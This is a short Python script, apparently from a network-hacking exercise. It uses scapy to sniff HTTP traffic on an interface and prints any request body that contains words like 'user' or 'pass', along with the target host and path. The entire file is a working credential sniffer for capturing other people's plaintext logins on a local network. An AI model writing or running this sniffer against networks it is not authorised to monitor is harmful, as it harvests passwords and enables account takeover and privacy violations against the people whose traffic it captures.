import scapy.all as scapy
from scapy_http.http import HTTPRequest
# from scapy.layers import http


# prn = function to be called every time a packet is received
# filter= 'udp', 'arp', 'tcp', 'port 21'(ftp) - bpf syntax: http://biot.com/capstats/bpf.html *optional
def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)


def get_url(packet):
    return packet[HTTPRequest].Host + packet[HTTPRequest].Path


def get_login(packet):
    # packet[<layer_name>].<field_name>
    load = packet[scapy.Raw].load.decode(encoding='utf-8', errors='ignore')
    # return load

    keywords = ('user', 'name', 'login', 'pass')
    for key in keywords:
        if key in load:
            return load


def process_sniffed_packet(packet):
    if packet.haslayer(HTTPRequest):

        # use scapy.<layer_name> for different layers
        if packet.haslayer(scapy.Raw):
            url = get_url(packet)
            login_info = get_login(packet)
            if login_info:
                print(f'[+] Possbile password: {login_info}, \n, [+] For URL: {url}')


# use 'wlan0' for real LAN
sniff('eth0')
